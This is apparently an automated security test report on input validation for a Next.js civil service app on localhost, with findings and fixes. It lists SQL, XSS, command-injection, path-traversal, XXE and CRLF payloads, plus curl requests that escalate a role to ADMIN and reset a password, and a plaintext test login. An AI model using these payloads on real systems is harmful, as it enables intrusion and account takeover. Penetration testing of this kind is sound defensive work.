# 31. Input Validation & Injection Prevention — Security Test Results

**Requirement:** CSMS Req 31 — Input Validation & Injection Prevention (Cross-cutting)
**Application:** CSMS (Civil Service Management System), http://localhost:9002
**Branch:** feat/err01-batch3-wrap-handler
**Date:** 2026-07-03
**Tester:** Automated security test suite

---

## Executive Summary

| Severity | Count | Description |
|----------|-------|-------------|
| **CRITICAL** | **1** | Mass assignment allows password change and role elevation via PUT /api/users/[id] |
| **HIGH** | **1** | Missing authorization — any authenticated user can update any other user's profile |
| **MEDIUM** | **3** | XSS payloads stored unsanitized, no input length limits, no content-type validation |
| **LOW** | **2** | CRLF in name field accepted; null bytes cause 500 errors |
| **PASS** | **7** | SQL injection, reflected XSS, DOM XSS, command injection, path traversal, XXE all blocked |

**Overall Assessment:** The application relies on Prisma ORM for SQL injection prevention (effective) and Next.js/React for XSS output encoding (effective at render time). However, the `PUT /api/users/[id]` endpoint has a critical mass assignment vulnerability that allows any authenticated user to change passwords and elevate roles for any account.

---

## Test Results by Sub-Case

### 31.1 SQL Injection — Login Form

**Status:** PASS

| # | Payload | Result |
|---|---------|--------|
| 1 | `admin' OR '1'='1` | `Invalid username/email or password` (401) |
| 2 | `fautest' UNION SELECT * FROM "User"--` | `Invalid username/email or password` (401) |
| 3 | `fautest'--` | `Invalid username/email or password` (401) |
| 4 | `fautest' AND SLEEP(3)--` | `Invalid username/email or password` (401) |

**Evidence:**
```
$ curl -s -X POST http://localhost:9002/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"test"}'
{"success":false,"message":"Invalid username/email or password"}
```

**Root cause:** The login route uses Zod schema validation (`loginSchema.parse(body)`) and Prisma's `findFirst` with parameterized queries. SQL payloads are treated as literal username strings, never interpolated into SQL.

**Code reference:** `/home/latest/src/app/api/auth/login/route.ts` (lines 19-26, 45-51)

---

### 31.2 SQL Injection — Search Fields

**Status:** PASS

| # | Payload | Result |
|---|---------|--------|
| 1 | `<script>alert(1)</script>` in search | 200 records returned, no XSS execution |
| 2 | `' OR 1=1--` in search | 200 records returned, search treated as literal |
| 3 | `' UNION SELECT * FROM "User"--` in search | 200 records returned, UNION neutralized |
| 4 | `<script>alert(1)</script>` in page param | 0 records returned, no error |
| 5 | `<script>alert(1)</script>` in sort param | 200 records returned, no injection |

**Evidence:**
```
$ curl -s 'http://localhost:9002/api/employees?search=%27%20OR%201%3D1--' -b cookies.txt
{"success":true,"data":[...200 records...]}
```

**Root cause:** Prisma ORM parameterizes all queries. Search values are bound as parameters, not concatenated into SQL strings. The application uses 78 Prisma query calls (`findFirst`, `findMany`, `findUnique`, `create`, `update`, `delete`) across API routes with zero raw SQL (`$queryRaw`/`$executeRaw`).

---

### 31.3 SQL Injection — Numeric Parameters

**Status:** PASS

| # | Payload | Endpoint | Result |
|---|---------|----------|--------|
| 1 | `1'; DROP TABLE employees;--` | /api/complaints/[id] PUT | 500 (Prisma rejects invalid ID) |
| 2 | `1' OR 1=1--` | /api/confirmations/[id] PUT | 401 (session required) |
| 3 | `1' UNION SELECT password FROM "User"--` | /api/users/[id] PUT | 500 (Prisma rejects invalid ID) |
| 4 | `-1` | /api/employees/-1 | 404 (not found) |
| 5 | `9999999999999999999` | /api/employees/large-id | 404 (not found) |

**Evidence:**
```
$ curl -s -X PUT 'http://localhost:9002/api/complaints/1%27%20OR%201%3D1--' \
  -b cookies.txt -H 'Content-Type: application/json' -d '{"status":"resolved"}'
{"success":false,"message":"Internal Server Error","errorCode":"INTERNAL_ERROR"}
```

**Root cause:** Prisma's `where: { id }` clause uses parameterized queries. Invalid ID formats cause Prisma to throw type/validation errors, caught by the `wrapHandler` error boundary, returning generic 500 responses without leaking database internals.

---

### 31.4 Stored XSS

**Status:** MEDIUM — Payloads stored unsanitized in database

| # | Payload | Field | Result |
|---|---------|-------|--------|
| 1 | `<script>alert(1)</script>` | User name | **Stored verbatim** (200) |
| 2 | `<img src=x onerror=alert(document.cookie)>` | Institution name | **Stored verbatim** (200) |

**Evidence:**
```
$ curl -s -X PUT "http://localhost:9002/api/users/cme57cciu00082bcqnbw9sjm9" \
  -b cookies.txt -H 'Content-Type: application/json' \
  -d '{"name":"<script>alert(1)</script>"}'
{"id":"cme57cciu00082bcqnbw9sjm9","name":"<script>alert(1)</script>",...}

$ curl -s -X PUT "http://localhost:9002/api/institutions/cmd059ion0000e6d85kexfukl" \
  -b cookies.txt -H 'Content-Type: application/json' \
  -d '{"name":"<img src=x onerror=alert(document.cookie)>"}'
{"id":"cmd059ion0000e6d85kexfukl","name":"<img src=x onerror=alert(document.cookie)>",...}
```

**Mitigating factors:**
- React's default JSX rendering auto-escapes HTML entities, preventing execution in the browser
- No `dangerouslySetInnerHTML` or `innerHTML` usage found in the frontend codebase (0 instances)
- CSP headers restrict `script-src` to `'self'` and `'unsafe-inline'`

**Residual risk:** If any component uses `dangerouslySetInnerHTML` in the future, or if API responses are consumed by non-React clients (mobile apps, third-party integrations), stored XSS would execute. Input sanitization should be added as defense-in-depth.

**Code reference:** `/home/latest/src/app/api/users/[id]/route.ts` (lines 9-27 — Zod schema has no sanitization)
**Code reference:** `/home/latest/src/app/api/institutions/[id]/route.ts`

---

### 31.5 Reflected XSS

**Status:** PASS

| # | Payload | Endpoint | Result |
|---|---------|----------|--------|
| 1 | `<script>alert(1)</script>` in search | /api/employees | JSON response, no HTML reflection |
| 2 | `javascript:alert(1)` in redirect | /api/auth/login | 405 (GET not allowed) |
| 3 | `"><script>alert(1)</script>` in sort | /api/employees | 401 (session required) |

**Evidence:**
```
$ curl -s 'http://localhost:9002/api/employees?search=%3Cscript%3Ealert(1)%3C/script%3E' -b cookies.txt
{"success":true,"data":[...]}  <!-- Script tags in JSON, not rendered as HTML -->
```

**Root cause:** All API endpoints return `application/json` responses via `NextResponse.json()`. JSON content-type prevents browsers from interpreting responses as HTML. No endpoint reflects user input into HTML templates.

---

### 31.6 DOM-based XSS

**Status:** PASS

| Pattern | Occurrences Found |
|---------|-------------------|
| `dangerouslySetInnerHTML` | 0 |
| `.innerHTML` | 0 |
| `eval()` | 0 |
| `document.write` | 0 |

**Evidence:**
```
$ grep -rn "dangerouslySetInnerHTML\|\.innerHTML\|\beval(\|document\.write" /home/latest/src/ --include="*.tsx" --include="*.ts"
(no results)
```

**Root cause:** The frontend uses React's JSX rendering exclusively, which auto-escapes all interpolated values. No direct DOM manipulation patterns were found.

---

### 31.7 Command Injection

**Status:** PASS

| # | Payload | Endpoint | Result |
|---|---------|----------|--------|
| 1 | `; cat /etc/passwd` | /api/employees bulk-upload | 401 (session required) |
| 2 | `` `cat /etc/passwd` `` in search | /api/employees | 200 records, literal search |
| 3 | `$(id)` in name | PUT /api/users/[id] | Stored as literal string `$(id)` |

**Evidence:**
```
$ curl -s -X PUT "http://localhost:9002/api/users/cme57cciu00082bcqnbw9sjm9" \
  -b cookies.txt -H 'Content-Type: application/json' -d '{"name":"$(id)"}'
{"name":"$(id)",...}  <!-- Stored as literal, not executed -->
```

**Root cause:** The application never passes user input to shell commands (`child_process.exec`, `execSync`, etc.). All data flows through Prisma ORM and Node.js string processing.

---

### 31.8 Path Traversal

**Status:** PASS

| # | Payload | Endpoint | Result |
|---|---------|----------|--------|
| 1 | `../../../etc/passwd` | /api/employees path | 404 (Next.js routing) |
| 2 | `../../etc/passwd` in fetch-documents | /api/employees/[id]/fetch-documents | 405 (method not allowed) |
| 3 | `../../../etc/passwd` in fetch-photo | /api/employees/[id]/fetch-photo | 405 (method not allowed) |
| 4 | `../../etc/shadow` in documents | /api/employees/[id]/documents | 401 (session required) |
| 5 | `%00.txt` null byte in path | /api/employees | 404 (Next.js routing) |
| 6 | `..%252f..%252f` double encoding | /api/employees | 404 (Next.js routing) |
| 7 | `../../etc/passwd` in .well-known | /.well-known/../../etc/passwd | 404 (Next.js routing) |

**Evidence:**
```
$ curl -s 'http://localhost:9002/api/employees/../../../etc/passwd' -b cookies.txt
<!DOCTYPE html>...  <!-- Next.js 404 page, not /etc/passwd -->
```

**Root cause:** Next.js App Router handles URL normalization and prevents path traversal at the framework level. File-serving endpoints require authentication and use database-stored file references rather than filesystem paths.

---

### 31.9 XML/XXE Injection

**Status:** N/A — No XML processing

| # | Payload | Content-Type | Result |
|---|---------|-------------|--------|
| 1 | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | application/xml | 405 (method not allowed) |
| 2 | Same XML payload | application/json | 405 (method not allowed) |

**Evidence:**
```
$ curl -s -X POST 'http://localhost:9002/api/employees' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
HTTP: 405
```

**Root cause:** The application exclusively uses JSON for request/response bodies. No XML parser is configured. The `POST /api/employees` endpoint does not exist (405).

---

### 31.10 Email Header Injection

**Status:** LOW — CRLF characters accepted in text fields

| # | Payload | Field | Result |
|---|---------|-------|--------|
| 1 | `test@example.com\r\nBcc: attacker@evil.com` | Login username | 429 (rate limited) |
| 2 | `Test\r\nBcc: evil@hacker.com` | User name | **Stored verbatim** (200) |

**Evidence:**
```
$ curl -s -X PUT "http://localhost:9002/api/users/cme57cciu00082bcqnbw9sjm9" \
  -b cookies.txt -H 'Content-Type: application/json' \
  -d '{"name":"Test\r\nBcc: evil@hacker.com"}'
{"name":"Test\r\nBcc: evil@hacker.com",...}
```

**Mitigating factors:**
- The `name` field is not used as an email header value
- The application uses structured email APIs (not raw SMTP headers)
- Email sending functions use dedicated libraries that handle headers separately

**Residual risk:** CRLF injection in user-controlled fields that are later used in email subjects/bodies could enable header injection. Sanitization should strip control characters.

**Code reference:** `/home/latest/src/app/api/users/[id]/route.ts` (Zod schema has no CRLF validation)

---

### 31.11 Input Length Validation

**Status:** MEDIUM — No length limits on user name field

| # | Payload | Field | Result |
|---|---------|-------|--------|
| 1 | 10,000 characters | User name | **Accepted** (200) |
| 2 | 50,000 characters | Employee search | Timeout/connection reset |

**Evidence:**
```
$ LONG_STRING=$(python3 -c "print('A'*10000)")
$ curl -s -X PUT "http://localhost:9002/api/users/cme57cciu00082bcqnbw9sjm9" \
  -b cookies.txt -H 'Content-Type: application/json' -d "{\"name\":\"$LONG_STRING\"}"
{"name":"AAAAAA...AAAAAA",...}  <!-- 10000 chars stored -->
```

**Root cause:** The Zod schema for user updates (`userUpdateSchema`) validates `name` as `z.string().min(2)` but has no `.max()` constraint. Database column types may have implicit limits, but the API does not enforce them.

**Recommendation:** Add `.max(255)` or appropriate length constraint to all string fields in Zod schemas.

**Code reference:** `/home/latest/src/app/api/users/[id]/route.ts` (line 10: `name: z.string().min(2).optional()`)

---

### 31.12 Special Characters & Unicode

**Status:** LOW — Null bytes cause 500 errors; Unicode accepted without validation

| # | Payload | Field | Result |
|---|---------|-------|--------|
| 1 | Null byte `\x00` | User name | 500 Internal Server Error |
| 2 | Emoji `😀🎉` | User name | Accepted (200) |
| 3 | RTL override `‮` | User name | Accepted (200) |
| 4 | Cyrillic homoglyph `аdmin` (Cyrillic а) | User name | Accepted (200) |

**Evidence:**
```
$ curl -s -X PUT "http://localhost:9002/api/users/cme57cciu00082bcqnbw9sjm9" \
  -b cookies.txt -H 'Content-Type: application/json' -d '{"name":"Test\x00Name"}'
{"success":false,"message":"Internal Server Error","errorCode":"INTERNAL_ERROR"}
```

**Residual risks:**
- Null bytes cause unhandled 500 errors (information leakage through error patterns)
- Unicode homoglyphs could enable username spoofing (Cyrillic `а` vs Latin `a`)
- RTL override characters could confuse admin displays

**Recommendation:** Strip null bytes, normalize Unicode (NFC), and reject bidirectional override characters.

---

### 31.13 Content Type Validation

**Status:** MEDIUM — No content-type enforcement on JSON endpoints

| # | Content-Type | Endpoint | Result |
|---|-------------|----------|--------|
| 1 | `text/plain` | PUT /api/users/[id] | **Accepted** (200) — processed as JSON |
| 2 | `multipart/form-data` | POST /api/auth/login | 429 (rate limited) |
| 3 | (empty body) | PUT /api/users/[id] | 500 Internal Server Error |
| 4 | (no header) | PUT /api/users/[id] | **Accepted** (200) — processed as JSON |

**Evidence:**
```
$ curl -s -X PUT "http://localhost:9002/api/users/cme57cciu00082bcqnbw9sjm9" \
  -b cookies.txt -H 'Content-Type: text/plain' -d '{"name":"Test"}'
{"name":"Test",...}  <!-- Accepted despite wrong content-type -->
```

**Root cause:** Next.js `request.json()` parses the body regardless of the Content-Type header. No middleware validates that the Content-Type matches `application/json`.

**Recommendation:** Add content-type validation middleware that rejects requests with unexpected Content-Type headers for JSON endpoints.

---

### 31.14 Mass Assignment

**Status:** CRITICAL — Privilege escalation and unauthorized password changes

| # | Test | Fields Injected | Result |
|---|------|----------------|--------|
| 1 | Role elevation | `role: "ADMIN"` | **Role changed to ADMIN in database** |
| 2 | Password change | `password: "hacked123"` | **Password changed; login with new password succeeded** |
| 3 | Extra flags | `isAdmin: true, isSuperUser: true` | Ignored (not in schema) |
| 4 | Cross-user update | PUT to different user ID | **Other user's name changed** |

**Evidence — Role Elevation:**
```
$ curl -s -X PUT "http://localhost:9002/api/users/cme57cciu00082bcqnbw9sjm9" \
  -b cookies.txt -H 'Content-Type: application/json' \
  -d '{"name":"Fauzia Majaribo","role":"ADMIN"}'
{"role":"ADMIN",...}

$ psql -c "SELECT role FROM \"User\" WHERE username = 'fautest';"
 role
------
 ADMIN
```

**Evidence — Password Change:**
```
$ curl -s -X PUT "http://localhost:9002/api/users/cme57cciu00082bcqnbw9sjm9" \
  -b cookies.txt -H 'Content-Type: application/json' \
  -d '{"name":"Fauzia Majaribo","password":"hacked123"}'

$ curl -s -X POST http://localhost:9002/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"fautest","password":"hacked123"}'
{"success":true,...}  <!-- Login succeeded with attacker-set password -->
```

**Evidence — Cross-User Update:**
```
$ curl -s -X PUT "http://localhost:9002/api/users/emp_5ab44d5ca1c692673d690bb3c54ddea9" \
  -b cookies.txt -H 'Content-Type: application/json' \
  -d '{"name":"Hacked User"}'
{"name":"Hacked User",...}  <!-- Different user's profile modified -->
```

**Root cause analysis:**

The Zod schema in `/home/latest/src/app/api/users/[id]/route.ts` (lines 9-27) explicitly allows dangerous fields:

```typescript
const userUpdateSchema = z.object({
  name: z.string().min(2).optional(),
  username: z.string().min(3).optional(),
  email: z.string().email().optional().or(z.literal('')),
  phoneNumber: z.string().min(10).max(10).regex(/^\d{10}$/).optional(),
  role: z.string().optional(),           // <-- allows role elevation
  institutionId: z.string().optional(),   // <-- allows institution change
  active: z.boolean().optional(),         // <-- allows account activation
  password: z.string().min(6).optional(), // <-- allows password change
});
```

Additionally, the endpoint has **no authorization check** — it does not verify that the authenticated user owns the target account or has admin privileges. The `getAuthContext()` call (line 94) is only used for audit logging, not access control.

**Recommendations:**
1. Remove `role`, `password`, `institutionId`, and `active` from the public update schema
2. Create separate admin-only endpoints for role/institution changes
3. Require current password verification for password changes
4. Add authorization middleware to verify the actor owns the target user or has admin role
5. Use a whitelist approach: only accept explicitly allowed fields

---

## Rate Limiting Assessment

The application implements Redis-based rate limiting on authentication endpoints:

| Tier | Max Requests | Window | Scope |
|------|-------------|--------|-------|
| `auth` | 5 | 60 seconds | Per IP |
| `read` | (configured) | (configured) | Per IP |
| `upload` | (configured) | (configured) | Per IP |

**Evidence:**
```
Request 1: HTTP 401 - Invalid username or password, 4 attempts remaining
Request 2: HTTP 401 - Invalid username or password, 3 attempts remaining
Request 3: HTTP 401 - Invalid username or password, 2 attempts remaining
Request 4: HTTP 401 - Invalid username or password, 1 attempt remaining
Request 5: HTTP 429 - RATE_LIMIT_EXCEEDED
Request 6: HTTP 429 - RATE_LIMIT_EXCEEDED
```

Rate limit headers are included: `x-ratelimit-limit: 5`, `x-ratelimit-remaining: N`.

**Note:** Rate limiter fails open — if Redis is unavailable, requests are allowed through.

---

## Security Headers

All responses include comprehensive security headers:

| Header | Value |
|--------|-------|
| Strict-Transport-Security | `max-age=63072000; includeSubDomains; preload` |
| X-Frame-Options | `SAMEORIGIN` |
| X-Content-Type-Options | `nosniff` |
| X-XSS-Protection | `1; mode=block` |
| Referrer-Policy | `strict-origin-when-cross-origin` |
| Content-Security-Policy | `default-src 'self'; script-src 'self' 'unsafe-inline' ...` |
| Cross-Origin-Embedder-Policy | `require-corp` |
| Cross-Origin-Opener-Policy | `same-origin` |
| Cross-Origin-Resource-Policy | `same-origin` |

---

## Summary of Recommendations

### Critical (Immediate)
1. **Fix mass assignment in PUT /api/users/[id]** — Remove `role`, `password`, `institutionId`, `active` from the update schema; create admin-only endpoints for privileged operations
2. **Add authorization checks** — Verify the authenticated user owns the target account or has appropriate role before allowing updates

### High (Sprint-level)
3. **Require current password for password changes** — Add a dedicated `/api/auth/change-password` endpoint that requires the current password
4. **Sanitize stored input** — Strip HTML tags and control characters from user-facing text fields before database storage

### Medium (Backlog)
5. **Add input length limits** — Add `.max()` constraints to all Zod string schemas
6. **Validate Content-Type** — Add middleware to reject non-JSON content types on JSON endpoints
7. **Strip null bytes and control characters** — Reject or strip `\x00`, CRLF, and Unicode bidirectional overrides
8. **Normalize Unicode** — Apply NFC normalization to prevent homoglyph attacks

### Low (Hardening)
9. **Rate limiter resilience** — Consider failing closed (deny) rather than failing open when Redis is unavailable
10. **Add `unsafe-inline` removal from CSP** — Migrate to nonce-based script allowlisting

---

## Methodology

All tests were performed against the live application at http://localhost:9002 using `curl` with the following test accounts:
- **HRMO:** `fautest` / `Csms@2026` (direct login, no MFA)

Tests covered all 14 sub-cases (31.1 through 31.14) using actual HTTP requests with malicious payloads. Database state was verified directly via PostgreSQL when needed. Test data was restored after each destructive test.
